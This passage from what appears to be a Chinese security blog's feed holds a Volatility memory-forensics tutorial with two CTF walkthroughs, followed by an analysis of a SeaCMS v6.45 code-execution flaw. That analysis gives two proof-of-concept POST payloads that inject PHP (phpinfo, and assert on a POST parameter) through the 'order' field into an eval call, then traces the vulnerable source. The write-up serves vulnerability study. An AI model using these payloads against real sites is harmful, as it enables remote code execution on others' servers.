kdbgscan</h3><p><code>kdbgscan</code>这个插件可以扫描文件的profile的值，通常扫描结果有多个，只有一个结果完全正确。kdbgscan和<code>imageinfo</code>仅适用于Windows内存镜像。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">volatility</span> -f easy_dump.img kdbgscan<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/CTF-Volatility/3.png" alt="3"></p><h3 id="1-3-pslist"><a href="#1-3-pslist" class="headerlink" title="1.3 pslist"></a>1.3 pslist</h3><p> <code>pslist</code>可以用来列出运行的进程。如果Exit所在的一列显示了日期时间，则表明该进程已经结束了。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">volatility</span> -f easy_dump.img --profile=Win<span class="hljs-number">7</span>SP<span class="hljs-number">1</span>x<span class="hljs-number">64</span> pslist<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/CTF-Volatility/4.png" alt="4"></p><h3 id="1-4-hivelist"><a href="#1-4-hivelist" class="headerlink" title="1.4 hivelist"></a>1.4 hivelist</h3><p><code>hivelist</code>可以用来列举缓存在内存中的注册表。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">volatility</span> -f easy_dump.img --profile=Win<span class="hljs-number">7</span>SP<span class="hljs-number">1</span>x<span class="hljs-number">64</span> hivelist<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/CTF-Volatility/5.png" alt="5"></p><h3 id="1-5-filescan"><a href="#1-5-filescan" class="headerlink" title="1.5 filescan"></a>1.5 filescan</h3><p><code>filescan</code>可以扫描内存中的文件</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">volatility</span> -f easy_dump.img --profile=Win<span class="hljs-number">7</span>SP<span class="hljs-number">1</span>x<span class="hljs-number">64</span> filescan<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/CTF-Volatility/6.png" alt="6"></p><h3 id="1-6-dumpfiles"><a href="#1-6-dumpfiles" class="headerlink" title="1.6 dumpfiles"></a>1.6 dumpfiles</h3><p> <code>dumpfiles</code>可以将内存中的缓存文件导出</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">volatility</span> -f easy_dump.img --profile=Win<span class="hljs-number">7</span>SP<span class="hljs-number">1</span>x<span class="hljs-number">64</span> dumpfiles -Q <span class="hljs-number">0</span>x<span class="hljs-number">00000000236</span>eb<span class="hljs-number">5</span>e<span class="hljs-number">0</span> -D ./ -u<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/CTF-Volatility/7.png" alt="7"></p><p>以上只是一些基本操作，具体可以查阅官方手册</p><blockquote><p><a href="https://github.com/volatilityfoundation/volatility/wiki/Command-Reference">https://github.com/volatilityfoundation/volatility/wiki/Command-Reference</a></p></blockquote><h2 id="2-CTF案例"><a href="#2-CTF案例" class="headerlink" title="2. CTF案例"></a>2. CTF案例</h2><h3 id="2-1-JarvisOJ-取证题"><a href="#2-1-JarvisOJ-取证题" class="headerlink" title="2.1 JarvisOJ 取证题"></a>2.1 JarvisOJ 取证题</h3><p>题目下载地址</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">链接: https:<span class="hljs-regexp">//</span>pan.baidu.com<span class="hljs-regexp">/s/</span><span class="hljs-number">1</span>hvAhL78aDS4IDxatF3uH0A 提取码: <span class="hljs-number">943</span>u<br></code></pre></td></tr></table></figure><p>解压之后得到两个文件，其中一个是vmem文件，使用volatility进行分析。</p><p><img src="https://image.mengsec.com/CTF-Volatility/8.png" alt="8"></p><p>使用pslist列举运行中的进程，发现有TrueCrypt.exe,而且没有退出。</p><p><img src="https://image.mengsec.com/CTF-Volatility/9.png" alt="9"></p><p>推测题目所给的另一个文件是使用TrueCrypt进行加密了的。进程没有退出，那么加密的密钥有可能就在进程中，将该进程作为文件导出。</p><p><img src="https://image.mengsec.com/CTF-Volatility/10.png" alt="10"></p><p>然后使用Elcomsoft Forensic Disk Decryptor进行解密，首先在导出的内存镜像中搜索key.</p><p><img src="https://image.mengsec.com/CTF-Volatility/11.png" alt="11"></p><p>因为是文件，选择TrueCrypt(container)。</p><p><img src="https://image.mengsec.com/CTF-Volatility/12.png" alt="12"></p><p><img src="https://image.mengsec.com/CTF-Volatility/13.png" alt="13"></p><p>选中待解密文件和dmp镜像，软件会自动寻找key,然后将key保存。</p><p><img src="https://image.mengsec.com/CTF-Volatility/14.png" alt="14"></p><p><img src="https://image.mengsec.com/CTF-Volatility/15.png" alt="15"></p><p>使用保存的key对文件进行解密，然后挂载即可获得flag。</p><p><img src="https://image.mengsec.com/CTF-Volatility/16.png" alt="16"></p><p><img src="https://image.mengsec.com/CTF-Volatility/17.png" alt="17"></p><h3 id="2-2-护网杯2018-Misc-Easy-dump"><a href="#2-2-护网杯2018-Misc-Easy-dump" class="headerlink" title="2.2 护网杯2018-Misc-Easy_dump"></a>2.2 护网杯2018-Misc-Easy_dump</h3><p>题目下载地址</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">链接：https:<span class="hljs-regexp">//</span>pan.baidu.com<span class="hljs-regexp">/s/</span><span class="hljs-number">1</span>Vwp7MeM-<span class="hljs-number">7</span>hkTMGeRu_aKTg 提取码：vw1r<br></code></pre></td></tr></table></figure><p>是一个img文件，使用volatilty进行分析。</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">volatility</span> -f easy_dump.img imageinfo<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/CTF-Volatility/18.png" alt="18"></p><p>使用pslist查看进程。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">volatility</span> -f easy_dump.img --profile=Win<span class="hljs-number">7</span>SP<span class="hljs-number">1</span>x<span class="hljs-number">64</span> pslist<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/CTF-Volatility/19.png" alt="19"></p><p>有一个DumpIt.exe，使用memdump命令将其dump出来。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">volatility</span> -f easy_dump.img --profile=Win<span class="hljs-number">7</span>SP<span class="hljs-number">1</span>x<span class="hljs-number">64</span> memdump -p <span class="hljs-number">2888</span> -D ./<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/CTF-Volatility/20.png" alt="20"></p><p>使用foremost进行分析，发现有个压缩包，解压后获得一个message.img</p><p><img src="https://image.mengsec.com/CTF-Volatility/21.png" alt="21"></p><p>file命令检测一下，发现是ext2文件系统数据。</p><p><img src="https://image.mengsec.com/CTF-Volatility/22.png" alt="22"></p><p>使用DiskGenius打开message.img。找到一个vim的swp文件，</p><p><img src="https://image.mengsec.com/CTF-Volatility/23.png" alt="23"></p><p>使用<code>vim -r</code>命令恢复，得到一段字符串</p><figure class="highlight erlang-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs erlang-repl">yispyweise!dmsx_tthv_arr_didvi<br></code></pre></td></tr></table></figure><p>在磁盘目录中找到一个hint.txt。</p><p><img src="https://image.mengsec.com/CTF-Volatility/24.png" alt="24"></p><p>看起来很像坐标点，使用python的PIL库画出来。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs stylus">from PIL import Image<br><br>file = open(<span class="hljs-string">&#x27;hint.txt&#x27;</span>,<span class="hljs-string">&#x27;r&#x27;</span>)<br>data = file<span class="hljs-selector-class">.read</span>()<br>pic = Image<span class="hljs-selector-class">.new</span>(<span class="hljs-string">&#x27;RGB&#x27;</span>,(<span class="hljs-number">300</span>,<span class="hljs-number">300</span>))<br>data = data<span class="hljs-selector-class">.split</span>(<span class="hljs-string">&#x27;\n&#x27;</span>)<br><span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> data:<br><span class="hljs-selector-tag">a</span> = <span class="hljs-selector-tag">i</span><span class="hljs-selector-class">.split</span>(<span class="hljs-string">&#x27; &#x27;</span>)<br>x = int(<span class="hljs-selector-tag">a</span><span class="hljs-selector-attr">[0]</span>)<br>y = int(<span class="hljs-selector-tag">a</span><span class="hljs-selector-attr">[1]</span>)<br>pic<span class="hljs-selector-class">.putpixel</span>(<span class="hljs-selector-attr">[x,y]</span>,(<span class="hljs-number">255</span>, <span class="hljs-number">255</span>, <span class="hljs-number">255</span>))<br>pic<span class="hljs-selector-class">.show</span>()<br>pic<span class="hljs-selector-class">.save</span>(<span class="hljs-string">&#x27;result.png&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/CTF-Volatility/25.png" alt="25"></p><p>扫描一下，</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Here <span class="hljs-keyword">is</span> the vigenere key: aeolus, but i deleted the <span class="hljs-keyword">encrypted</span> message。<br></code></pre></td></tr></table></figure><p>维吉尼亚密码，在线解码即可</p><p><img src="https://image.mengsec.com/CTF-Volatility/26.png" alt="26"></p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Fornesics</tag>
      
      <tag>Volatility</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SeaCMS v6.45前台代码执行漏洞分析</title>
    <link href="/2018/08/06/SeaCMS-v6-45%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <url>/2018/08/06/SeaCMS-v6-45%E5%89%8D%E5%8F%B0%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>SeaCMS没有使用框架，比较适合练习。</p><a id="more"></a><h3 id="1-源码下载"><a href="#1-源码下载" class="headerlink" title="1. 源码下载"></a>1. 源码下载</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">链接：https:<span class="hljs-regexp">//</span>pan.baidu.com<span class="hljs-regexp">/s/</span><span class="hljs-number">1</span>uw_VnxnvG4GGEae4TRsGGw<br><br>密码：cd48<br></code></pre></td></tr></table></figure><h3 id="2-POC"><a href="#2-POC" class="headerlink" title="2. POC"></a>2. POC</h3><p>第一种</p><figure class="highlight elm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elm"><span class="hljs-title">http</span>://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/seacms/search.php<br><span class="hljs-type">POST</span>:search<span class="hljs-keyword">type</span>=5&amp;order=&#125;&#123;end if&#125; &#123;if:1)phpinfo();if(1&#125;&#123;end if&#125;<br></code></pre></td></tr></table></figure><p>第二种</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs reasonml">http:<span class="hljs-comment">//127.0.0.1/seacms/search.php</span><br>POST:searchtype=<span class="hljs-number">5</span>&amp;order=&#125;&#123;<span class="hljs-keyword">end</span> <span class="hljs-keyword">if</span>&#125; &#123;<span class="hljs-keyword">if</span>:<span class="hljs-number">1</span>)print<span class="hljs-constructor">_r($<span class="hljs-params">_POST</span>[<span class="hljs-params">a</span>]($<span class="hljs-params">_POST</span>[<span class="hljs-params">b</span>])</span>);<span class="hljs-comment">//&#125;&#123;end if&#125;&amp;a=assert&amp;b=phpinfo();</span><br></code></pre></td></tr></table></figure><p>效果图</p><p><img src="https://image.mengsec.com/18-8-6/49244924.jpg"></p><h3 id="3-漏洞原理分析"><a href="#3-漏洞原理分析" class="headerlink" title="3. 漏洞原理分析"></a>3. 漏洞原理分析</h3><h4 id="3-1-代码执行简单流程"><a href="#3-1-代码执行简单流程" class="headerlink" title="3.1 代码执行简单流程"></a>3.1 代码执行简单流程</h4><p><img src="https://image.mengsec.com/18-8-6/81792070.jpg"></p><h4 id="3-2-详细分析"><a href="#3-2-详细分析" class="headerlink" title="3.2 详细分析"></a>3.2 详细分析</h4><p>代码执行的原因是<code>$order</code>参数没做严格的限制，就将其传入了模板文件中，然后使用<code>eval()</code>执行模板中包含<code>$order</code>的代码。</p><p> 首先，在文件<code>seacms/search.php</code>中，包含了文件<code>seacms/include/common.php</code>,在<code>common.php</code>中第45-48行，将GET,POST等请求传入的全局变量中的键值对转换成变量，并对其中的值使用<code>addslashes()</code>进行处理。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_RunMagicQuotes</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$svar</span></span>)</span><br><span class="hljs-function"></span>&#123;<br><span class="hljs-keyword">if</span>(!get_magic_quotes_gpc())<br>&#123;<br><span class="hljs-keyword">if</span>( is_array(<span class="hljs-variable">$svar</span>) )<br>&#123;<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$svar</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$_k</span> =&gt; <span class="hljs-variable">$_v</span>) <span class="hljs-variable">$svar</span>[<span class="hljs-variable">$_k</span>] = _RunMagicQuotes(<span class="hljs-variable">$_v</span>);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-variable">$svar</span> = addslashes(<span class="hljs-variable">$svar</span>); <span class="hljs-comment"># 转义单引号、双引号、反斜线、NULL</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$svar</span>;<br>&#125;<br><span class="hljs-keyword">foreach</span>(<span class="hljs-keyword">Array</span>(<span class="hljs-string">&#x27;_GET&#x27;</span>,<span class="hljs-string">&#x27;_POST&#x27;</span>,<span class="hljs-string">&#x27;_COOKIE&#x27;</span>) <span class="hljs-keyword">as</span> <span class="hljs-variable">$_request</span>)<br>&#123;<br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$$_request</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$_k</span> =&gt; <span class="hljs-variable">$_v</span>) $&#123;<span class="hljs-variable">$_k</span>&#125; = _RunMagicQuotes(<span class="hljs-variable">$_v</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>然后在<code>seacms/search.php</code>文件的<code>echoSearchPage()</code>函数中，也就是文件第63行，将变量注册成全局变量。</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit"><span class="hljs-keyword">global</span> $dsql,$cfg_iscache,$mainClassObj,$page,$t1,$cfg_search_time,$searchtype,$searchword,$tid,$year,$letter,$area,$yuyan,$state,$ver,$order,$jq,$money,$cfg_basehost<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>可以看到，在<code>search.php</code>中，执行<code>echoSearchPage()</code>函数之前，没有对<code>$order</code>变量进行处理。</p><p>接着往下看，在<code>echoSearchPage()</code>函数中，使用<code>$searchtype</code>来选择使用的模板文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(intval(<span class="hljs-variable">$searchtype</span>)==<span class="hljs-number">5</span>)<br>&#123;<br><span class="hljs-variable">$searchTemplatePath</span> = <span class="hljs-string">&quot;/templets/&quot;</span>.<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;cfg_df_style&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;cfg_df_html&#x27;</span>].<span class="hljs-string">&quot;/cascade.html&quot;</span>;<br><span class="hljs-variable">$typeStr</span> = !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$tid</span>)?intval(<span class="hljs-variable">$tid</span>).<span class="hljs-string">&#x27;_&#x27;</span>:<span class="hljs-string">&#x27;0_&#x27;</span>;<br><span class="hljs-variable">$yearStr</span> = !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$year</span>)?PinYin(<span class="hljs-variable">$year</span>).<span class="hljs-string">&#x27;_&#x27;</span>:<span class="hljs-string">&#x27;0_&#x27;</span>;<br><span class="hljs-variable">$letterStr</span> = !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$letter</span>)?<span class="hljs-variable">$letter</span>.<span class="hljs-string">&#x27;_&#x27;</span>:<span class="hljs-string">&#x27;0_&#x27;</span>;<br><span class="hljs-variable">$areaStr</span> = !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$area</span>)?PinYin(<span class="hljs-variable">$area</span>).<span class="hljs-string">&#x27;_&#x27;</span>:<span class="hljs-string">&#x27;0_&#x27;</span>;<br><span class="hljs-variable">$orderStr</span> = !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$order</span>)?<span class="hljs-variable">$order</span>.<span class="hljs-string">&#x27;_&#x27;</span>:<span class="hljs-string">&#x27;0_&#x27;</span>;<br><span class="hljs-variable">$jqStr</span> = !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$jq</span>)?<span class="hljs-variable">$jq</span>.<span class="hljs-string">&#x27;_&#x27;</span>:<span class="hljs-string">&#x27;0_&#x27;</span>;<br><span class="hljs-variable">$cacheName</span>=<span class="hljs-string">&quot;parse_cascade_&quot;</span>.<span class="hljs-variable">$typeStr</span>.<span class="hljs-variable">$yearStr</span>.<span class="hljs-variable">$letterStr</span>.<span class="hljs-variable">$areaStr</span>.<span class="hljs-variable">$orderStr</span>;<br><span class="hljs-variable">$pSize</span> = getPageSizeOnCache(<span class="hljs-variable">$searchTemplatePath</span>,<span class="hljs-string">&quot;cascade&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br>&#125;<span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$cfg_search_time</span>&amp;&amp;<span class="hljs-variable">$page</span>==<span class="hljs-number">1</span>) checkSearchTimes(<span class="hljs-variable">$cfg_search_time</span>);<br><span class="hljs-variable">$searchTemplatePath</span> = <span class="hljs-string">&quot;/templets/&quot;</span>.<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;cfg_df_style&#x27;</span>].<span class="hljs-string">&quot;/&quot;</span>.<span class="hljs-variable">$GLOBALS</span>[<span class="hljs-string">&#x27;cfg_df_html&#x27;</span>].<span class="hljs-string">&quot;/search.html&quot;</span>;<br><span class="hljs-variable">$cacheName</span>=<span class="hljs-string">&quot;parse_search_&quot;</span>;<br><span class="hljs-variable">$pSize</span> = getPageSizeOnCache(<span class="hljs-variable">$searchTemplatePath</span>,<span class="hljs-string">&quot;search&quot;</span>,<span class="hljs-string">&quot;&quot;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>当值是5时，会使用<code>cascade.html</code>，文件目录为<code>seacms\templets\default\html\cascade.html</code>，若不是，则会使用<code>earch.html</code>，文件目录为<code>seacms\templets\default\html\search.html</code>。</p><p>下面153行，将模板文件读取到<code>$content</code>变量中，接着在155-173行替换标签。其中第158行使用<code>$order</code>替换了模板中<code>&#123;searchpage:ordername&#125;</code>标签。然后分别搜索<code>search.html</code>和<code>cascade.html</code>，只有<code>cascade.html</code>第79-81行存在该标签。</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;&#123;searchpage:order-time-link&#125;&quot;</span> &#123;<span class="hljs-keyword">if</span>:<span class="hljs-string">&quot;&#123;searchpage:ordername&#125;&quot;</span>==<span class="hljs-string">&quot;time&quot;</span>&#125; <span class="hljs-attribute">class</span>=<span class="hljs-string">&quot;btn btn-success&quot;</span> &#123;<span class="hljs-keyword">else</span>&#125; <span class="hljs-attribute">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span> &#123;end <span class="hljs-keyword">if</span>&#125; <span class="hljs-attribute">id</span>=<span class="hljs-string">&quot;orderhits&quot;</span>&gt;最新上映&lt;/a&gt;<br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;&#123;searchpage:order-hit-link&#125;&quot;</span> &#123;<span class="hljs-keyword">if</span>:<span class="hljs-string">&quot;&#123;searchpage:ordername&#125;&quot;</span>==<span class="hljs-string">&quot;hit&quot;</span>&#125; <span class="hljs-attribute">class</span>=<span class="hljs-string">&quot;btn btn-success&quot;</span> &#123;<span class="hljs-keyword">else</span>&#125; <span class="hljs-attribute">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span> &#123;end <span class="hljs-keyword">if</span>&#125; <span class="hljs-attribute">id</span>=<span class="hljs-string">&quot;orderaddtime&quot;</span>&gt;最近热播&lt;/a&gt;<br>&lt;a <span class="hljs-attribute">href</span>=<span class="hljs-string">&quot;&#123;searchpage:order-score-link&#125;&quot;</span> &#123;<span class="hljs-keyword">if</span>:<span class="hljs-string">&quot;&#123;searchpage:ordername&#125;&quot;</span>==<span class="hljs-string">&quot;score&quot;</span>&#125; <span class="hljs-attribute">class</span>=<span class="hljs-string">&quot;btn btn-success&quot;</span> &#123;<span class="hljs-keyword">else</span>&#125; <span class="hljs-attribute">class</span>=<span class="hljs-string">&quot;btn btn-default&quot;</span> &#123;end <span class="hljs-keyword">if</span>&#125; <span class="hljs-attribute">id</span>=<span class="hljs-string">&quot;ordergold&quot;</span>&gt;评分最高&lt;/a&gt;<br></code></pre></td></tr></table></figure><p>因此，必须要<code>$searchtype==5</code>。</p><p>接着往下走，在第212行</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$content</span>=<span class="hljs-variable">$mainClassObj</span>-&gt;parseIf(<span class="hljs-variable">$content</span>);<br></code></pre></td></tr></table></figure><p>跟进去，在<code>seacms\include\main.class.php</code>中第3098-3147行中。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parseIf</span>(<span class="hljs-params"><span class="hljs-variable">$content</span></span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$content</span>, <span class="hljs-string">&#x27;&#123;if:&#x27;</span>) === <span class="hljs-literal">false</span>) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$content</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$labelRule</span> = buildregx(<span class="hljs-string">&quot;&#123;if:(.*?)&#125;(.*?)&#123;end if&#125;&quot;</span>, <span class="hljs-string">&quot;is&quot;</span>);<br>        <span class="hljs-variable">$labelRule2</span> = <span class="hljs-string">&quot;&#123;elseif&quot;</span>;<br>        <span class="hljs-variable">$labelRule3</span> = <span class="hljs-string">&quot;&#123;else&#125;&quot;</span>;<br>        preg_match_all(<span class="hljs-variable">$labelRule</span>, <span class="hljs-variable">$content</span>, <span class="hljs-variable">$iar</span>);<br>        <span class="hljs-variable">$arlen</span> = count(<span class="hljs-variable">$iar</span>[<span class="hljs-number">0</span>]);<br>        <span class="hljs-variable">$elseIfFlag</span> = <span class="hljs-literal">false</span>;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$m</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$m</span> &lt; <span class="hljs-variable">$arlen</span>; <span class="hljs-variable">$m</span>++) &#123;<br>            <span class="hljs-variable">$strIf</span> = <span class="hljs-variable">$iar</span>[<span class="hljs-number">1</span>][<span class="hljs-variable">$m</span>];<br>            <span class="hljs-variable">$strIf</span> = <span class="hljs-keyword">$this</span>-&gt;parseStrIf(<span class="hljs-variable">$strIf</span>);<br>            <span class="hljs-variable">$strThen</span> = <span class="hljs-variable">$iar</span>[<span class="hljs-number">2</span>][<span class="hljs-variable">$m</span>];<br>            <span class="hljs-variable">$strThen</span> = <span class="hljs-keyword">$this</span>-&gt;parseSubIf(<span class="hljs-variable">$strThen</span>);<br>            <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$strThen</span>, <span class="hljs-variable">$labelRule2</span>) === <span class="hljs-literal">false</span>) &#123;<br>                <span class="hljs-keyword">if</span> (strpos(<span class="hljs-variable">$strThen</span>, <span class="hljs-variable">$labelRule3</span>) &gt;= <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-variable">$elsearray</span> = explode(<span class="hljs-variable">$labelRule3</span>, <span class="hljs-variable">$strThen</span>);<br>                    <span class="hljs-variable">$strThen1</span> = <span class="hljs-variable">$elsearray</span>[<span class="hljs-number">0</span>];<br>                    <span class="hljs-variable">$strElse1</span> = <span class="hljs-variable">$elsearray</span>[<span class="hljs-number">1</span>];<br>                    @<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;if(&quot;</span> . <span class="hljs-variable">$strIf</span> . <span class="hljs-string">&quot;)&#123;\$ifFlag=true;&#125;else&#123;\$ifFlag=false;&#125;&quot;</span>);<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$ifFlag</span>) &#123;<br>                        <span class="hljs-variable">$content</span> = str_replace(<span class="hljs-variable">$iar</span>[<span class="hljs-number">0</span>][<span class="hljs-variable">$m</span>], <span class="hljs-variable">$strThen1</span>, <span class="hljs-variable">$content</span>);<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-variable">$content</span> = str_replace(<span class="hljs-variable">$iar</span>[<span class="hljs-number">0</span>][<span class="hljs-variable">$m</span>], <span class="hljs-variable">$strElse1</span>, <span class="hljs-variable">$content</span>);<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    @<span class="hljs-keyword">eval</span>(<span class="hljs-string">&quot;if(&quot;</span> . <span class="hljs-variable">$strIf</span> . <span class="hljs-string">&quot;) &#123; \$ifFlag=true;&#125; else&#123; \$ifFlag=false;&#125;&quot;</span>);<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$ifFlag</span>) &#123;<br>                        <span class="hljs-variable">$content</span> = str_replace(<span class="hljs-variable">$iar</span>[<span class="hljs-number">0</span>][<span class="hljs-variable">$m</span>], <span class="hljs-variable">$strThen</span>, <span class="hljs-variable">$content</span>);<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        <span class="hljs-variable">$content</span> = str_replace(<span 